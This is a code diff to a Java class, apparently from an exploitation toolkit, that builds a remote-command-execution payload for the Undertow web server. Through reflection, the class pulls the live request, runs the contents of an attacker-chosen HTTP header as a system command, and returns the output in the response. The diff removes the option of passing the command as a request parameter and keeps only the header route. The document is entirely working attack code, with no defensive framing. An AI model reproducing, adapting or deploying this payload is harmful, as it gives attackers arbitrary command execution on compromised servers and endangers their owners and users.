@@ -16,10 +16,10 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Undertow)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER})
 public class UndertowRE {
     private static String HEADER;
-    private static String PARAM;
+    
 
     public UndertowRE() {
         try {
@@ -39,14 +39,7 @@ public class UndertowRE {
                     Object response = getFieldValue(value, "originalResponse");
 
                     Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-                    Object param = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-                    String str = null;
-                    if (header != null) {
-                        str = (String) header;
-                    } else if (param != null) {
-                        str = (String) param;
-                    }
-                    String result = exec(str);
+                    String result = exec((String) header);
                     invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
                     Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
                     invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
